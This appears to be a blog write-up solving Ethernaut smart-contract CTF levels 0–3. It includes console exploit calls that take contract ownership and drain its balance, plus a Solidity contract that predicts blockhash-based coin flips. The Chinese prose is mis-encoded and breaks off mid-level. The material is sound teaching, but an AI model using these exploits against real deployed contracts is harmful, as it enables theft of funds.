<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Ethernaut æ˜¯å­¸ç¿’å€å¡ŠéˆåŠ solidity éå¸¸å¥½çš„å…¥é–€å­¸ç¿’ææ–™ï¼Œä¹‹å‰æ˜¯åœ¨ Rinkeby æ¸¬è©¦ç¶²ä¸Šï¼Œä½†æ¸¬è©¦ç¶²æœƒé™¸çºŒé—œæ‰ï¼Œä¹‹å¾Œå¯ä»¥åœ¨ local éƒ¨ç½²ã€‚
é‚„æ˜¯ç´€éŒ„ä¸€ä¸‹è§£é¡ŒğŸ±
äº‹å‰æº–å‚™ Metamask Remix æ¸¬è©¦å¹£ï¼šhttps://faucet.paradigm.xyz/ Web3.js åŸºç¤ 0. Hello Ethernaut æ‰“é–‹ console(F12)ï¼Œç›®æ¨™è®“ clear = trueã€‚ è§€å¯Ÿ authenticate() éœ€å‚³å…¥ passkeyï¼Œ
1 2 3 4 5 function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } password æ˜¯å€‹ public è®Šæ•¸ã€‚
1 string public password; 1 2 await contract.password() // output: &amp;#39;ethernaut0&amp;#39; æ‹¿åˆ° password å‚³å…¥ authenticate()
1 await contract.authenticate(&amp;#39;ethernaut0&amp;#39;) Level completed.'><title>Ethernaut Writeup</title>

<link rel='canonical' href='https://ashirleyshe.github.io/p/ethernaut-writeup/'>

<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Ethernaut Writeup'>
<meta property='og:description' content='Ethernaut æ˜¯å­¸ç¿’å€å¡ŠéˆåŠ solidity éå¸¸å¥½çš„å…¥é–€å­¸ç¿’ææ–™ï¼Œä¹‹å‰æ˜¯åœ¨ Rinkeby æ¸¬è©¦ç¶²ä¸Šï¼Œä½†æ¸¬è©¦ç¶²æœƒé™¸çºŒé—œæ‰ï¼Œä¹‹å¾Œå¯ä»¥åœ¨ local éƒ¨ç½²ã€‚
é‚„æ˜¯ç´€éŒ„ä¸€ä¸‹è§£é¡ŒğŸ±
äº‹å‰æº–å‚™ Metamask Remix æ¸¬è©¦å¹£ï¼šhttps://faucet.paradigm.xyz/ Web3.js åŸºç¤ 0. Hello Ethernaut æ‰“é–‹ console(F12)ï¼Œç›®æ¨™è®“ clear = trueã€‚ è§€å¯Ÿ authenticate() éœ€å‚³å…¥ passkeyï¼Œ
1 2 3 4 5 function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } password æ˜¯å€‹ public è®Šæ•¸ã€‚
1 string public password; 1 2 await contract.password() // output: &amp;#39;ethernaut0&amp;#39; æ‹¿åˆ° password å‚³å…¥ authenticate()
1 await contract.authenticate(&amp;#39;ethernaut0&amp;#39;) Level completed.'>
<meta property='og:url' content='https://ashirleyshe.github.io/p/ethernaut-writeup/'>
<meta property='og:site_name' content='A'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ethernaut' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Solidity' /><meta property='article:published_time' content='2022-08-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-08-26T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="Ethernaut Writeup">
<meta name="twitter:description" content="Ethernaut æ˜¯å­¸ç¿’å€å¡ŠéˆåŠ solidity éå¸¸å¥½çš„å…¥é–€å­¸ç¿’ææ–™ï¼Œä¹‹å‰æ˜¯åœ¨ Rinkeby æ¸¬è©¦ç¶²ä¸Šï¼Œä½†æ¸¬è©¦ç¶²æœƒé™¸çºŒé—œæ‰ï¼Œä¹‹å¾Œå¯ä»¥åœ¨ local éƒ¨ç½²ã€‚
é‚„æ˜¯ç´€éŒ„ä¸€ä¸‹è§£é¡ŒğŸ±
äº‹å‰æº–å‚™ Metamask Remix æ¸¬è©¦å¹£ï¼šhttps://faucet.paradigm.xyz/ Web3.js åŸºç¤ 0. Hello Ethernaut æ‰“é–‹ console(F12)ï¼Œç›®æ¨™è®“ clear = trueã€‚ è§€å¯Ÿ authenticate() éœ€å‚³å…¥ passkeyï¼Œ
1 2 3 4 5 function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } password æ˜¯å€‹ public è®Šæ•¸ã€‚
1 string public password; 1 2 await contract.password() // output: &amp;#39;ethernaut0&amp;#39; æ‹¿åˆ° password å‚³å…¥ authenticate()
1 await contract.authenticate(&amp;#39;ethernaut0&amp;#39;) Level completed.">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/wanhsin_hu366a5cf9d6ed6a7819b52901816f26e5_1994279_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ±</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">A</a></h1>
            <h2 class="site-description">Fat Cat</h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="https://ashirleyshe.github.io/" selected>English</option>
                        
                            <option value="https://ashirleyshe.github.io/zh-tw/" >ç¹é«”ä¸­æ–‡</option>
                        
                    </select>
                </li>
            
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ethernaut-writeup/">Ethernaut Writeup</a>
        </h2>
    
        
    </div>

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Aug 26, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    17 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>
</header>

    <section class="article-content">
    
    
    <p><a class="link" href="https://ethernaut.openzeppelin.com/"  target="_blank" rel="noopener"
    >Ethernaut</a> æ˜¯å­¸ç¿’å€å¡ŠéˆåŠ solidity éå¸¸å¥½çš„å…¥é–€å­¸ç¿’ææ–™ï¼Œä¹‹å‰æ˜¯åœ¨ Rinkeby æ¸¬è©¦ç¶²ä¸Šï¼Œä½†æ¸¬è©¦ç¶²æœƒé™¸çºŒé—œæ‰ï¼Œä¹‹å¾Œå¯ä»¥åœ¨ local <a class="link" href="https://github.com/OpenZeppelin/ethernaut"  target="_blank" rel="noopener"
    >éƒ¨ç½²</a>ã€‚</p>
<p>é‚„æ˜¯ç´€éŒ„ä¸€ä¸‹è§£é¡ŒğŸ±</p>
<h2 id="äº‹å‰æº–å‚™">äº‹å‰æº–å‚™</h2>
<ol>
<li>Metamask</li>
<li>Remix</li>
<li>æ¸¬è©¦å¹£ï¼š<a class="link" href="https://faucet.paradigm.xyz/"  target="_blank" rel="noopener"
    >https://faucet.paradigm.xyz/</a></li>
<li>Web3.js åŸºç¤</li>
</ol>
<h2 id="0-hello-ethernaut">0. Hello Ethernaut</h2>
<p>æ‰“é–‹ console(F12)ï¼Œç›®æ¨™è®“ <code>clear = true</code>ã€‚
è§€å¯Ÿ <code>authenticate()</code> éœ€å‚³å…¥ passkeyï¼Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">passkey</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">passkey</span><span class="p">))</span> <span class="o">==</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">password</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">cleared</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>password æ˜¯å€‹ public è®Šæ•¸ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">string</span> <span class="k">public</span> <span class="n">password</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">password</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1">// output: &#39;ethernaut0&#39;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‹¿åˆ° password å‚³å…¥ authenticate()</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">authenticate</span><span class="p">(</span><span class="s1">&#39;ethernaut0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="1-fallback">1. Fallback</h2>
<p>è®“ <code>owner = player</code> ä¸” contract balance = 0</p>
<p>è§€å¯Ÿ <code>receive()</code> å¯ä»¥åšåˆ°ï¼Œä½†éœ€ç¹éæ¢ä»¶ msg.value &gt; 0 ä¸” contributions[msg.sender] &gt; 0ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>contributions[msg.sender] &gt; 0
é€é <code>contribute()</code> é”æˆæ­¤æ¢ä»¶</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">contribute</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">contributions</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">contributions</span><span class="p">[</span><span class="n">owner</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>é€ ether çµ¦åˆç´„é€²å…¥ <code>receive()</code></li>
<li>æ­¤æ™‚ <code>owner = player</code>ï¼ŒonlyOwner å¯éï¼Œèª¿ç”¨ <code>withdraw()</code> å¯ä»¥é ˜å…¨éƒ¨çš„éŒ¢</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">owner</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">contribute</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span> <span class="nx">toWei</span><span class="p">(</span><span class="s2">&#34;0.00001&#34;</span><span class="p">)});</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">send</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span> <span class="nx">toWei</span><span class="p">(</span><span class="s2">&#34;0.00001&#34;</span><span class="p">)});</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¢ºå®š balance = 0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// output: 0
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="2-fallout">2. Fallout</h2>
<p>ç›®æ¨™ <code>owner = player</code></p>
<p>èˆŠç‰ˆæœ¬ Solidity åˆç´„åŒåçš„å‡½æ•¸ä½œç‚º constructor</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="cm">/* constructor */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">Fal1out</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">allocations</span><span class="p">[</span><span class="n">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-1">Exploit</h3>
<p>ç›´æ¥å‘¼å« <code>Fal1out()</code> å°±å®Œäº‹äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">Fal1out</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="3-coin-flip">3. Coin Flip</h2>
<p>çŒœç¡¬å¹£æ­£åé¢éŠæˆ²ï¼Œéœ€é€£çºŒçŒœå° 10 æ¬¡ï¼ˆä¸åŒ blockï¼‰i.e. <code>consecutiveWins = 10</code></p>
<p>ç”¨ block.number ä½œç‚ºéš¨æ©Ÿæ•¸</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¯æ¬¡çŒœæ¸¬éœ€åœ¨ä¸åŒ block</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">lastHash</span> <span class="o">==</span> <span class="n">blockValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-2">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#39;./SafeMath.sol&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ICoinFlip</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flip</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_guess</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">CoinFlip</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">guess</span><span class="p">(</span><span class="kt">address</span> <span class="n">levelInstance</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">coinFlip</span> <span class="o">=</span> <span class="n">blockValue</span><span class="p">.</span><span class="n">div</span><span class="p">(</span><span class="n">FACTOR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">side</span> <span class="o">=</span> <span class="n">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">side</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ICoinFlip</span><span class="p">(</span><span class="n">levelInstance</span><span class="p">).</span><span class="n">flip</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ICoinFlip</span><span class="p">(</span><span class="n">levelInstance</span><span class="p">).</span><span class="n">flip</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check <code>consecutiveWins</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
